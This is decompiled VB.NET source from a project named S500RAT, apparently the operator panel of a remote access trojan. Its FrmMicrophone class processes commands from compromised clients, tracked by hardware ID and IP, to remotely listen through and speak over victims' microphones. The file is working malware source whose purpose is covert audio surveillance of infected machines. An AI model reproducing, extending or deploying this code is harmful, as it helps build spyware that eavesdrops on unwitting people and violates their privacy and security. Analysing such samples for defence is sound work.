Imports System
Imports System.Windows.Forms
Imports MessagePackLib.MessagePack
Imports Microsoft.VisualBasic
Imports Microsoft.VisualBasic.CompilerServices
Imports S500RAT.My.Resources
Imports S500RAT.Server.Connection

Namespace S500RAT
	' Token: 0x02000053 RID: 83
	Public Class FrmMicrophone
		' Token: 0x0600119B RID: 4507 RVA: 0x0009AA14 File Offset: 0x00098C14
		Public Sub AddArrary(client As Clients, unpack_msgpack As MsgPack)
			Try
				Dim microphone As Microphone = CType(Application.OpenForms("Microphone" + unpack_msgpack.ForcePathObject("Hwid").AsString), Microphone)
				Dim asString As String = unpack_msgpack.ForcePathObject("Command").AsString
				If Operators.CompareString(asString, "setClient", False) <> 0 Then
					If Operators.CompareString(asString, "Speak", False) <> 0 Then
						If Operators.CompareString(asString, "Listen", False) <> 0 Then
							If Operators.CompareString(asString, "Connect", False) <> 0 Then
								If Operators.CompareString(asString, "Disconnect", False) <> 0 Then
									If Operators.CompareString(asString, "Prog", False) = 0 Then
										Dim maximum As Integer = If((-If((Conversions.ToBoolean(unpack_msgpack.ForcePathObject("Max").AsString) > False), 1, 0)), 1, 0)
										Dim num As Integer = If((-If((Conversions.ToBoolean(unpack_msgpack.ForcePathObject("Value").AsString) > False), 1, 0)), 1, 0)
										Interaction.MsgBox(num, MsgBoxStyle.OkOnly, Nothing)
										Dim flag As Boolean = microphone IsNot Nothing
										If flag Then
											Try
												microphone.ProgressBar1.Maximum = maximum
												microphone.ProgressBar1.Value = num
											Catch ex As Exception
												microphone.ProgressBar1.Maximum = 100
												microphone.ProgressBar1.Value = 0
											End Try
										End If
									End If
								Else
									Dim flag2 As Boolean = Conversions.ToBoolean(unpack_msgpack.ForcePathObject("StateDisconnect").AsString)
									Dim flag3 As Boolean = microphone IsNot Nothing
									If flag3 Then
										microphone.StartAndStop.Enabled = True
										Dim flag4 As Boolean = Not flag2
										If flag4 Then
											microphone.StartAndStop.Text = "Start"
										Else
											microphone.StartAndStop.Text = "Stop"
										End If
									End If
								End If
							Else
								Dim asString2 As String = unpack_msgpack.ForcePathObject("StateConnect").AsString
								Dim flag5 As Boolean = microphone IsNot Nothing
								If flag5 Then
									microphone.StartAndStop.Enabled = True
									Dim flag6 As Boolean = Conversions.ToBoolean(asString2)
									If flag6 Then
										microphone.StartAndStop.Text = "Stop"
									Else
										microphone.StartAndStop.Text = "Start"
									End If
								End If
							End If
						Else
							Dim flag7 As Boolean = Conversions.ToBoolean(unpack_msgpack.ForcePathObject("IsListen").AsString)
							Dim flag8 As Boolean = microphone IsNot Nothing
							If flag8 Then
								Dim flag9 As Boolean = flag7
								If flag9 Then
									microphone.ListenClient.Enabled = True
									microphone.ListenClient.Image = Resources.ListenONN
									microphone.ListenClient.Enabled = True
								Else
									microphone.ListenClient.Enabled = True
									microphone.ListenClient.Image = Resources.ListenOFF
									microphone.ListenClient.Enabled = True
								End If
							End If
						End If
					Else
						Dim flag10 As Boolean = Conversions.ToBoolean(unpack_msgpack.ForcePathObject("IsSpeak").AsString)
						Dim flag11 As Boolean = microphone IsNot Nothing
						If flag11 Then
							Dim flag12 As Boolean = flag10
							If flag12 Then
								microphone.SpeakClient.Enabled = True
								microphone.SpeakClient.Image = Resources.MicON
							Else
								microphone.SpeakClient.Enabled = True
								microphone.SpeakClient.Image = Resources.MicON
							End If
						End If
					End If
				Else
					Dim flag13 As Boolean = microphone IsNot Nothing
					If flag13 Then
						Dim flag14 As Boolean = microphone.Client Is Nothing
						If flag14 Then
							microphone.Client = client
							microphone.StartAndStop.Enabled = True
							microphone.Timer1.Enabled = True
							microphone.SpeakClient.Enabled = True
							microphone.ListenClient.Enabled = True
							microphone.SpeakServer.Enabled = True
							microphone.ListenServer.Enabled = True
							Try
								microphone.IP = unpack_msgpack.ForcePathObject("IP").AsString
							Catch ex2 As Exception
							End Try
							Try
								microphone.InitComboboxesServer()
							Catch ex3 As Exception
							End Try
							Try
								microphone.CombxSpeakClient.Items.Clear()
								Dim asString3 As String = unpack_msgpack.ForcePathObject("Speak").AsString
								Dim array As String() = asString3.Split(New String() { "-==>" }, StringSplitOptions.None)
								Dim num2 As Integer = array.Length - 1
								For i As Integer = 0 To num2
									Dim flag15 As Boolean = array(i).Length > 0
									If flag15 Then
										Dim text As String = array(i)
										microphone.CombxSpeakClient.Items.Add(array(i))
									End If
									i += 2
								Next
								Dim flag16 As Boolean = microphone.CombxSpeakClient.Items.Count > 0
								If flag16 Then
									microphone.CombxSpeakClient.SelectedIndex = 0
								Else
									microphone.CombxSpeakClient.Enabled = False
								End If
							Catch ex4 As Exception
							End Try
							Try
								microphone.combxListenClient.Items.Clear()
								microphone.combxListenClient.Items.Add("None")
								Dim asString4 As String = unpack_msgpack.ForcePathObject("Listen").AsString
								Dim array2 As String() = asString4.Split(New String() { "-==>" }, StringSplitOptions.None)
								Dim num3 As Integer = array2.Length - 1
								For j As Integer = 0 To num3
									Dim flag17 As Boolean = array2(j).Length > 0
									If flag17 Then
										Dim text2 As String = array2(j)
										microphone.combxListenClient.Items.Add(array2(j))
									End If
									j += 2
								Next
								Dim flag18 As Boolean = microphone.combxListenClient.Items.Count > 0
								If flag18 Then
									microphone.combxListenClient.SelectedIndex = 1
								Else
									microphone.combxListenClient.Enabled = False
								End If
							Catch ex5 As Exception
							End Try
						End If
					End If
				End If
			Catch ex6 As Exception
				ListLogs.AddArray("Microphone " + client.IP + " Error : " + ex6.Message, 0)
			End Try
		End Sub
	End Class
End Namespace
